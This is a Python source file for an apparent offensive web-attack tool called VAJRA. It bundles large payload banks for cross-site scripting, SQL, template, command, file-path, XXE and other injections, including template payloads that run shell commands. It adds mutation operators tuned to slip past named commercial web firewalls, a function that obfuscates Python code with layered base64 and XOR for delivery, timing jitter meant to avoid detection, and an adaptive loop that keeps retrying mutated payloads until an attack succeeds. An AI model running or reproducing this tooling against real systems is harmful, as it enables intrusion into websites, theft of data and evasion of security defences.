"""VAJRA payload engine — vast payload banks, polymorphic mutation operators,
WAF-fingerprint-aware evasion strategies and an adaptive attacker loop whose
sole purpose is achieving the motive despite defensive filtering."""
import itertools
import random
import re
import urllib.parse

R = random.Random(1337)


def _c(base, events, triggers, wraps=("{}",)):
    out = []
    for tag, ev in itertools.product(base, events):
        for trig in triggers:
            vec = "<%s %s=%s>" % (tag, ev, trig)
            for w in wraps:
                out.append(w.replace("%s", vec) if "%s" in w else w.format(vec))
    return out


TRIGGERS = ["alert(1)", "confirm(1)", "prompt(1)", "alert(/x/)"]
EVENTS = ["onload", "onerror", "onmouseover", "onfocus", "onclick",
          "onanimationstart", "onpointerover", "ontoggle", "onbegin",
          "onpageshow", "oninput", "onauxclick", "onwheel", "oncopy"]
TAGS = ["svg", "img", "video", "audio", "body", "details", "marquee",
        "select", "textarea", "iframe", "object", "embed", "keygen",
        "form", "button", "input", "style", "table", "math"]

_XSS_CORE = (
    _c(TAGS[:8], EVENTS[:8], TRIGGERS) +
    _c(["img", "image", "svg"], ["src"], TRIGGERS, ["<x>%s</x>"]) +
    [
        '"><svg onload={t}>', '\'><svg onload={t}>', "</title><svg onload={t}>",
        "--><svg onload={t}>", "</textarea><svg onload={t}>",
        "</style><svg onload={t}>", "</script><svg onload={t}>",
        '"><img src=x onerror={t}>', "'><img src=x onerror={t}>",
        "<<svg onload={t}>", "<svg//onload={t}>", "<svg onload={t}//",
        "<svg/OnLoAd={t}>", "<SVG ONLOAD={t}>", "<svg\nonload={t}>",
        "<svg\tonload={t}>", "<svg onload\t={t}>",
        "<iframe srcdoc=\"&lt;svg onload={t}&gt;\">",
        "<object data='javascript:{t}'>", "<embed src='javascript:{t}'>",
        "<a href='javascript:{t}'>x</a>", "<a href='jAvAsCrIpT:{t}'>x</a>",
        "<a href='java\tscript:{t}'>x</a>", "<a href='java\nscript:{t}'>x</a>",
        "[![x](x)](javascript:{t})", "<form><button formaction=javascript:{t}>",
        "<isindex action=javascript:{t}>", "<math><mtext></form><form><mglyph>"
        "<style></math><img src onerror={t}>",
        "<svg><animate onbegin={t} attributeName=x>",
        "<svg><set attributeName=onload to={t}>",
        "<body onload={t}><svg onload={t}>",
        "<div onpointerover='{t}'>move</div>",
        "<xss id=x tabindex=1 onactivate={t}></xss>",
        "<script src=data:,alert(1)></script>",
        "<script>{t}</script>", "<scr<script>ipt>{t}</scr</script>ipt>",
        "<img/src=`x`onerror={t}>", "<img src=x:alert(alt) onerror=eval(src) alt=1>",
        "<svg><foreignObject><iframe srcdoc='<img src=x onerror={t}>'>",
        "javascript:{t}", "JaVaScRiPt:{t}", "&#106avascript:{t}",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:text/html,<script>{t}</script>",
        "'-{t}-'", "\";{t}//", "</span><svg onload={t}>",
        "{{constructor.constructor('{t}')()}}",
        "<template><script>{t}</script></template>",
        "<noscript><p title=\"</noscript><svg onload={t}>\">",
        "<x onclick={t}>click", "<x ondblclick={t}>dbl",
        "</br><svg onload={t}>", "&#60;svg onload={t}&#62;",
        "%3Csvg%20onload%3D{t}%3E",
    ]
)
XSS_BANK = sorted({p.format(t=t) for p in _XSS_CORE for t in TRIGGERS})

SQL_PREFIXES = ["'", '"', "`", "')", '")', "'))", '"))", ', "%')", "')))", "*'",
                "AND '", "OR '", "') OR ('1'='1"]
SQL_BODIES = [
    " OR '1'='1", " OR 1=1", "' OR ''='", "' OR 1=1-- -", "' OR 'a'='a",
    " UNION SELECT NULL-- -", " UNION ALL SELECT NULL,NULL-- -",
    " UNION SELECT NULL,NULL,NULL-- -", " UNION SELECT NULL,NULL,NULL,NULL-- -",
    " AND (SELECT 1)=1", "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
    " AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
    " AND XMLType(':')='1", "' AND 1=CONVERT(int,@@version)-- -",
    "'||UTL_HTTP.request('x')||'", "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner "
    "FROM v$version))='1",
    " ORDER BY 1-- -", " GROUP BY 1-- -", ";SELECT 1-- -",
    "' /*!50000OR*/ 1=1-- -", "' uni/**/on se/**/lect 1-- -",
    "%' AND 1=1-- -", "' AND SLEEP(0)-- -", "' AND BENCHMARK(0,MD5(1))-- -",
]
SQLI_BANK = sorted({p + b for p, b in itertools.product(SQL_PREFIXES, SQL_BODIES)} |
                   {"1" + b for b in SQL_BODIES[:12]})

TIME_SQLI = [
    "' AND SLEEP(5)-- -", "' AND SLEEP(7)-- -", "1 AND (SELECT SLEEP(5))-- -",
    "'; WAITFOR DELAY '0:0:6'--", "1;WAITFOR DELAY '0:0:6'--",
    "' || pg_sleep(6)-- -", "1;SELECT pg_sleep(6)--",
    "' AND (SELECT 6 FROM (SELECT SLEEP(6))a)-- -",
    "' AND BENCHMARK(80000000,MD5('x'))-- -",
    "' AND (SELECT COUNT(*) FROM information_schema.tables A, "
    "information_schema.tables B WHERE RAND()>0.01)>0-- -",
]

_LFI_TRAVERSALS = ["../", "....//", "..%2f", "..%2F", "%2e%2e%2f", "%2e%2e/",
                   ".%2e/", "..;;//", "....\\\\", "..\\\\..\\\\", "%c0%ae%c0%ae/"]
_LFI_TARGETS = ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/self/environ",
                "/proc/version", "/windows/win.ini", "/boot.ini",
                "/windows/system32/drivers/etc/hosts", "/var/log/apache2/access.log",
                "/var/log/auth.log", "C:/Windows/win.ini"]
LFI_BANK = []
for _tr in _LFI_TRAVERSALS:
    for _depth in range(1, 9):
        for _tgt in ("/etc/passwd", "/etc/shadow", "/windows/win.ini",
                     "/proc/self/environ"):
            LFI_BANK.append(_tr * _depth + _tgt.lstrip("/"))
LFI_BANK += [
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/zlib.deflate/resource=/etc/passwd",
    "file:///etc/passwd", "file://localhost/etc/passwd",
    "php://input", "data://text/plain,<?php echo passthru('id');?>",
    "expect://id", "/etc/passwd", "/etc/passwd%00", "/etc/passwd%00.html",
    "/etc/passwd..", "/././././././etc/passwd", "//etc/passwd",
    "\\\\localhost\\c$\\windows\\win.ini", "zip:///var/www/backup.zip#/shell.php",
    "phar:///var/www/html/images/phar.jpg/test.txt",
]
LFI_BANK = sorted(set(LFI_BANK))

RCE_SEPARATORS = [";", "|", "||", "&&", "&", "\n", "%0a", "\r\n", "`$((", "$(",
                  "${", "`"]
RCE_COMMANDS_SAFE = ["id", "whoami", "uname -a", "hostname", "cat /etc/passwd",
                     "ls -la", "pwd", "echo ${PATH}", "ip a", "ifconfig -a",
                     "cat /proc/version", "dir", "ver", "echo %USERNAME%",
                     "type C:\\Windows\\win.ini", "whoami /priv"]
RCE_BANK = []
for _sep in [";", "|", "||", "&&", "&", "%0a", "\n"]:
    for _cmd in RCE_COMMANDS_SAFE:
        RCE_BANK.extend(["%s %s" % (_sep, _cmd), "%s%s" % (_sep, _cmd),
                         "x%s %s" % (_sep, _cmd),
                         "'%s %s #" % (_sep, _cmd),
                         '"%s %s #' % (_sep, _cmd)])
RCE_BANK += ["`id`", "$(id)", "${id}", "$( `id` )", "{echo,id}|bash",
             "$(echo aWQ=|base64 -d)", "%0aid%0a", "&&id&&", "||id||",
             ";`id`;", "| id .x", "&&`id`&&", "$(id)//", "%24(id)",
             "\\id", "a;id;b", "a)|id|(", "a&id&b", "%26%26id%26%26"]
RCE_BANK = sorted(set(RCE_BANK))

SSTI_BANK = [
    "{{7*'7'}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*7}}", "#set($x=7*7)${x}",
    "{7*7}", "{{=7*7}}", "<%= 7 * 7 %>", "${\"\".getClass().forName(\"javax.script"
    ".ScriptEngineManager\")}",
    "{{config}}", "{{self}}", "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__base__.__subclasses__()[401]('id',shell=True,"
    "stdout=-1).communicate()}}",
    "{{request.__class__.__init__.__globals__['__builtins__']['__import__']"
    "('os').popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id')"
    ".read()}}",
    "{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id')"
    ".read()}}",
    "{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['system']"
    "('id')}}",
    "${T(java.lang.System).getenv()}", "${#rt '@java.lang.Runtime@getRuntime()"
    ".exec(\"id\")'}",
    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}"
    "{{_self.env.getFilter(\"id\")}}",
    "{{['id']|filter('system')}}", "{{['id']|map('system')}}",
    "{{'id'|syscall}}", "{{'id'|passthru}}", "{{apply('id')}}",
    "{php}system('id'){/php}", "{{smarty.version}}",
    "{php}echo `id`;{/php}", "<%= system('id') %>", "<%=`id`%>",
    "#{ 7 * 7 }", "@(7*7)", "#{T(java.lang.Runtime)}",
    "%{{7*7}}", "$%7B7*7%7D",
]
SSTI_MARKERS = [("7777777", "{{7*'7'}}"), ("49", "{{7*7}}")]

NOSQL_BANK = [
    '[$ne]=1&[$ne]=2', '{"$gt":""}', '{"$regex":".*"}',
    "true, $where: '1 == 1'", ", $where: '1 == 1'",
    "' || '1'=='1", "admin' && '1'=='1", "[$where]=sleep(2000)",
    "[$where]=function(){return true}",
    '{"username":{"$ne":"x"},"password":{"$ne":"x"}}',
    "[$nin][]=a&[$nin][]=b", "1[iN]=$gt", "?$where[]=1",
]

REDIRECT_BANK = [
    "//vajra-oob.example", "///vajra-oob.example", "/\\/\\/vajra-oob.example",
    "https:/\\vajra-oob.example", "https://vajra-oob.example",
    "https://%2f%2fvajra-oob.example", "https://vajra-oob.example%2f..",
    "//vajra-oob.example%2eexample.com", "//vajra-oob%E3%80%82example.com",
    "//vajra-oob.example#@allowed.com", "https://allowed.com@vajra-oob.example",
    "//vajra-oob.example\\.allowed.com", "https://vajra-oob.example?.allowed.com",
    "javascript://vajra-oob.example", "data:text/html;,vajra-oob.example",
    "/redirect?url=//vajra-oob.example", "..//vajra-oob.example",
    "////vajra-oob.example", "https:\\/vajra-oob.example",
    "%2f%2fvajra-oob.example", "%2F%2Evajra-oob.example",
]

CRLF_BANK = [
    "%0d%0aX-Vajra: injected", "%0d%0aSet-Cookie:vjr=1",
    "%0d%0a%0d%0a<html><h1>vjr</h1>", "%0aX-Vajra: 1",
    "%0d%0aLocation: https://vajra-oob.example",
    "%%0d0a%%0d0aX-Vajra: 1", "%E5%98%8A%E5%98%8DX-Vajra: 1",
    "%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D<script>alert(1)</script>",
]

XXE_BANK = [
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
    '<r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert'
    '.base64-encode/resource=/etc/passwd">]><r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "file:///etc/passwd">'
    '<!ENTITY % y "<!ENTITY z SYSTEM &#39;x&#39;>">%x;%y;]><r>&z;</r>',
]

LDAP_BANK = ["*)(uid=*))(|(uid=*", "*)(objectClass=*", "*)(&", "*))%00",
             "!(uid=*))(|(uid=*"]
XPATH_BANK = ["' or '1'='1", "'] | //user/* | /*['1='1", "'+''+'", "1 or 1=1",
              "' or count(/*)>0 or '"]


BANKS = {
    "xss": XSS_BANK,
    "sqli": SQLI_BANK,
    "sqli_time": TIME_SQLI,
    "lfi": LFI_BANK,
    "rce": RCE_BANK,
    "ssti": SSTI_BANK,
    "nosql": NOSQL_BANK,
    "redirect": REDIRECT_BANK,
    "crlf": CRLF_BANK,
    "xxe": XXE_BANK,
    "ldap": LDAP_BANK,
    "xpath": XPATH_BANK,
}


def bank_size(cls):
    return len(BANKS.get(cls, []))


def iter_bank(cls, cap=None):
    yield from BANKS.get(cls, [])[:cap] if cap else BANKS.get(cls, [])


# ---------------- mutation operators ----------------

def _ue(s, safe=""):
    return urllib.parse.quote(s, safe=safe)


MUTATORS = {
    "url_encode": lambda p: _ue(p),
    "url_encode_all": lambda p: "".join("%%%02X" % ord(c) for c in p),
    "double_url_encode": lambda p: _ue(_ue(p)),
    "unicode_escape": lambda p: "".join(
        ("%%%04X" % ord(c)) if c in "'\"<> ();" else c for c in p),
    "utf8_overlong": lambda p: p.replace("'", "%c0%a7").replace('"', "%c0%a2")
                               .replace("<", "%c0%bc"),
    "case_swap": lambda p: "".join(c.upper() if i % 2 else c.lower()
                                   for i, c in enumerate(p)),
    "upper": lambda p: str.upper(p) if isinstance(p, str) else p.upper(),
    "sql_inline_comment": lambda p: re.sub(r"(?i)\b(union|select|or|and|from|"
                                           r"insert|order|by|sleep)\b",
                                           lambda m: m.group(1)[:len(m.group(1))//2]
                                           + "/**/" + m.group(1)[len(m.group(1))//2:], p),
    "sql_version_comment": lambda p: p.replace(" OR ", " /*!50000OR */ ")
                                      .replace(" or ", " /*!50000or */ "),
    "null_byte": lambda p: p.replace("/", "/%00").replace(".", ".%00", 1),
    "tab_newline": lambda p: re.sub(r"\s+", lambda m: ("\t" if m.start() % 2 else
                                                       "\n"), p),
    "hpp": lambda p: p,
    "html_entities": lambda p: p.replace("&", "&amp;").replace("'", "&#39;")
                                .replace("<", "&lt;"),
    "hex_entities": lambda p: "".join(
        "&#x%X;" % ord(c) if c in "<>'\"()" else c for c in p),
    "slash_variants": lambda p: p.replace("/", "/./").replace("//", "/"),
    "dot_variants": lambda p: p.replace("../", "..;/").replace("./", ".;/"),
    "space_to_comment": lambda p: p.replace(" ", "/**/"),
    "space_plus": lambda p: _ue(p.replace(" ", "+"), safe="+"),
    "quote_alt": lambda p: p.replace("'", '%EF%BC%87'),
    "padding_junk": lambda p: "%%s=%s&zz=%s" % (_ue(p), rand_junk()),
    "reverse_sections": lambda p: p,
}


def rand_junk():
    return "".join(R.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(R.randint(6, 14)))


def pack(code, rounds=3, seed=1337):
    """Obfuscate python code for delivery as `python3 -c "..."`. Applies
    layered base64 / XOR-key / reversed-slice encodings (chosen at random)
    and emits a tiny inline decoder that walks the inverses then exec()s.
    This is delivery-evasion only, never security."""
    import base64 as _b64
    rr = random.Random(seed)
    cur = code.encode()
    applied = []
    for _ in range(rounds):
        kind = rr.choice(("b64", "xor", "rev"))
        if kind == "b64":
            cur = _b64.b64encode(cur)
            applied.append("b64")
        elif kind == "xor":
            key = bytes(rr.randrange(1, 256) for _ in range(8))
            cur = bytes(b ^ key[i % len(key)] for i, b in enumerate(cur))
            applied.append("xor:" + key.hex())
        else:
            cur = cur[::-1]
            applied.append("rev")
    inv = []
    for op in reversed(applied):
        if op == "b64":
            inv.append("__import__('base64').b64decode")
        elif op == "rev":
            inv.append("lambda b: b[::-1]")
        else:
            key = bytes.fromhex(op.split(":", 1)[1])
            inv.append("lambda b: bytes(c ^ (bytes.fromhex('%s'))[i %% %d] "
                       "for i, c in enumerate(b))" % (key.hex(), len(key)))
    expr = "__import__('base64').b64decode('%s')" % \
        _b64.b64encode(cur).decode()
    for f in inv:
        expr = "(%s)(%s)" % (f, expr)
    return "python3 -c \"exec(%s)\"" % expr


def sleep_jitter(mean, jitter=0.35):
    """Return a sleep duration jittered around `mean` seconds (±jitter),
    ending in a random sub-second offset to defeat burst correlation."""
    import time as _t
    low, high = mean * (1 - jitter), mean * (1 + jitter)
    base = R.uniform(low, high)
    if base >= 1 and jitter > 0:
        base -= R.random()
    return base


def apply_ops(payload, ops):
    cur = payload
    for op in ops:
        fn = MUTATORS.get(op)
        if not fn:
            continue
        try:
            nxt = fn(cur)
            if isinstance(nxt, str):
                cur = nxt
        except Exception:
            continue
    if "hpp" in ops:
        parts = [cur, payload]
        cur = cur
    return cur


DEFAULT_CHAINS = [
    [],
    ["case_swap"],
    ["url_encode"],
    ["space_to_comment"],
    ["double_url_encode"],
    ["sql_inline_comment"],
    ["utf8_overlong"],
    ["unicode_escape"],
    ["hex_entities"],
    ["url_encode_all"],
    ["null_byte"],
    ["slash_variants", "url_encode"],
    ["sql_version_comment", "space_to_comment"],
    ["case_swap", "sql_inline_comment"],
    ["tab_newline"],
    ["html_entities"],
    ["quote_alt", "url_encode"],
]

WAF_STRATEGIES = {
    "Cloudflare": [["case_swap"], ["space_to_comment"], ["sql_inline_comment"],
                   ["utf8_overlong", "url_encode"], ["hex_entities"],
                   ["tab_newline", "case_swap"]],
    "Akamai": [["url_encode"], ["double_url_encode"], ["case_swap"],
               ["slash_variants"], ["sql_inline_comment", "case_swap"]],
    "Imperva/Incapsula": [["double_url_encode"], ["utf8_overlong"],
                          ["space_to_comment"], ["null_byte"],
                          ["sql_inline_comment"]],
    "ModSecurity": [["space_to_comment"], ["sql_inline_comment"], ["case_swap"],
                    ["sql_version_comment"], ["unicode_escape"]],
    "AWS WAF": [["url_encode"], ["case_swap"], ["space_plus"],
                ["double_url_encode"]],
    "Sucuri": [["case_swap"], ["hex_entities"], ["tab_newline"]],
    "F5 BIG-IP ASM": [["null_byte"], ["double_url_encode"], ["case_swap"]],
    "Wordfence": [["case_swap"], ["html_entities"], ["space_to_comment"]],
    "Unknown": [["case_swap"], ["url_encode"], ["space_to_comment"]],
}

BLOCK_STATUSES = {403, 406, 418, 429, 501}
_BLOCK_PATTERNS = re.compile(
    r"(blocked|forbidden|denied|waf|firewall|security|captcha|cloudflare|"
    r"incapsula|sucuri|mod_security|modsecurity|akamai|reference #|"
    r"request unsuccessful|not acceptable|rejected)", re.I)


class Verdict:
    OK = "ok"
    BLOCKED = "blocked"


def classify_response(resp):
    """Return (Verdict, reason)."""
    if resp.status == 0:
        return Verdict.OK, ""
    if resp.status in BLOCK_STATUSES:
        return Verdict.BLOCKED, "status:%d" % resp.status
    head = resp.body[:2500].lower()
    if len(head) < 4000 and _BLOCK_PATTERNS.search(head) and \
            resp.status in (200, 302, 403, 406):
        return Verdict.BLOCKED, "signature"
    return Verdict.OK, ""


class AttackResult:
    def __init__(self):
        self.success = None
        self.technique = "direct"
        self.evidence = ""
        self.attempts = 0
        self.blocked = 0
        self.evasion_log = []

    @property
    def achieved(self):
        return self.success is not None


class AdaptiveAttacker:
    """Runs a payload bank against a sender until the motive is achieved.
    On WAF blocks it escalates through fingerprint-specific mutation chains."""

    def __init__(self, sender, motive, waf=None, max_direct=None,
                 max_mutants=14, on_attempt=None):
        self.sender = sender
        self.motive = motive
        self.waf = waf or "Unknown"
        self.max_direct = max_direct
        self.max_mutants = max_mutants
        self.on_attempt = on_attempt
        self.evasion_log = []
        self.blocked = 0

    def _chains(self):
        strat = WAF_STRATEGIES.get(self.waf, [])
        chains = list(strat)
        for c in DEFAULT_CHAINS:
            if c not in chains:
                chains.append(c)
        return chains

    def run(self, payloads):
        res = AttackResult()
        payloads = list(payloads)
        if self.max_direct:
            payloads = payloads[:self.max_direct]
        chains = self._chains()
        for payload in payloads:
            if res.achieved:
                break
            resp = self._send(payload)
            res.attempts += 1
            v, why = classify_response(resp)
            if self.motive(payload, resp):
                res.success = payload
                res.technique = "direct"
                res.evidence = self._ev(resp, payload)
                return res
            if v == Verdict.BLOCKED:
                res.blocked += 1
                self.blocked += 1
                for ops in chains[:max(3, min(len(chains), 6))]:
                    if res.attempts >= self.max_mutants + res.blocked + 20:
                        break
                    mutant = apply_ops(payload, ops)
                    if not mutant or mutant == payload:
                        continue
                    mresp = self._send(mutant)
                    res.attempts += 1
                    mv, _ = classify_response(mresp)
                    entry = {"original": payload[:160], "mutant": mutant[:160],
                             "ops": "+".join(ops), "waf": self.waf,
                             "result": "passed" if mv != Verdict.BLOCKED
                             else "still-blocked"}
                    if mv != Verdict.BLOCKED:
                        self.evasion_log.append(entry)
                        if self.motive(mutant, mresp):
                            res.success = mutant
                            res.technique = "evade:" + "+".join(ops)
                            res.evidence = self._ev(mresp, mutant)
                            return res
                    else:
                        self.evasion_log.append(entry)
                    if res.attempts - res.blocked > self.max_mutants * 3:
                        break
        return res

    def _send(self, p):
        try:
            r = self.sender(p)
            if self.on_attempt:
                self.on_attempt(p, r)
            return r
        except Exception:
            class _Z:
                status = 0
                body = ""
                headers = {}
            return _Z()

    @staticmethod
    def _ev(resp, payload):
        body = getattr(resp, "body", "")
        pos = body.lower().find(payload[:24].lower())
        frag = body[max(0, pos - 60):pos + 140] if pos >= 0 else body[:200]
        return "payload=%s\nhttp=%s\ncontext=%s" % (payload[:220],
                                                    getattr(resp, "status", 0),
                                                    frag.replace("\n", " ")[:260])


PASSWD_MARKERS = ("root:x:", "root:*:0:0:", "[extensions]", "; for 16-bit app")
SQL_ERR_RE = re.compile(r"(sql syntax|warning: mysql_|unclosed quotation|"
                        r"quoted string not properly terminated|pg::|fatal: syntax|"
                        r"sqlite3::|unrecognized token|ora-\d{5}|odbc.*driver|"
                        r"invalid query|mysql_fetch)", re.I)
UID_RE = re.compile(r"uid=\d+\([^)]+\)")
WIN_RE = re.compile(r"(?im)^([a-z]+\\)?[a-z0-9_$.\-]{2,32}$")


def motive_xss_factory(nonce):
    return lambda p, r: bool(nonce) and nonce in getattr(r, "body", "")


def motive_reflect(p, r):
    return p in getattr(r, "body", "")


def motive_sqli(p, r):
    return bool(SQL_ERR_RE.search(getattr(r, "body", "")[:60000]))


def motive_lfi(p, r):
    body = getattr(r, "body", "")
    return any(m in body for m in PASSWD_MARKERS)


def motive_rce(p, r):
    return bool(UID_RE.search(getattr(r, "body", ""))) or \
        bool(re.search(r"(?m)^(NT AUTHORITY|nt authority)", getattr(r, "body", "")))


def motive_ssti(marker):
    return lambda p, r: marker in getattr(r, "body", "")


def motive_redirect(hostmark):
    def motive(p, r):
        loc = getattr(r, "headers", {}).get("location", "") if hasattr(r, "headers") else ""
        import re as _re
        meta = _re.search(r'url=([^"\'>]+)', getattr(r, "body", "")[:2000], _re.I)
        dest = loc or (meta.group(1) if meta else "")
        return hostmark in dest.lower()
    return motive


def motive_header(header_name):
    def motive(p, r):
        return header_name in getattr(r, "headers", {})
    return motive


from core.payload_ext import (
    _XSS_EXTRA as _PE_XSS, _SQLI_EXTRA as _PE_SQLI, _LFI_EXTRA as _PE_LFI,
    _RCE_OBFUSCATED as _PE_RCE, _SSTI_EXTRA as _PE_SSTI,
    _NOSQL_EXTRA as _PE_NOSQL, _REDIRECT_EXTRA as _PE_RED,
    _CRLF_EXTRA as _PE_CRLF, _XXE_EXTRA as _PE_XXE,
    LDAP_BANK, XPATH_BANK, HEADER_INJECTION_BANK, CACHE_POISON_PARAMS,
    PROTOPOLL_BANK, SSRF_BANK, SSRF_MARKERS, JWT_WEAK_SECRETS,
    JWT_NONE_TOKEN_TPL)

BANKS["xss"] = sorted(set(BANKS["xss"]) | set(_PE_XSS))
BANKS["sqli"] = sorted(set(BANKS["sqli"]) | set(_PE_SQLI))
BANKS["lfi"] = sorted(set(BANKS["lfi"]) | set(_PE_LFI))
BANKS["rce"] = sorted(set(BANKS["rce"]) | set(_PE_RCE))
BANKS["ssti"] = sorted(set(BANKS["ssti"]) | set(_PE_SSTI))
BANKS["nosql"] = sorted(set(BANKS["nosql"]) | set(_PE_NOSQL))
BANKS["redirect"] = sorted(set(BANKS["redirect"]) | set(_PE_RED))
BANKS["crlf"] = sorted(set(BANKS["crlf"]) | set(_PE_CRLF))
BANKS["xxe"] = sorted(set(BANKS["xxe"]) | set(_PE_XXE))
BANKS["ldap"] = sorted(set(LDAP_BANK))
BANKS["xpath"] = sorted(set(XPATH_BANK))
BANKS["header_injection"] = sorted(set(HEADER_INJECTION_BANK))
BANKS["cache_poison"] = list(CACHE_POISON_PARAMS)
BANKS["protopoll"] = sorted(set(PROTOPOLL_BANK))
BANKS["ssrf"] = sorted(set(SSRF_BANK))

PAYLOAD_CLASSES = sorted(BANKS.keys())
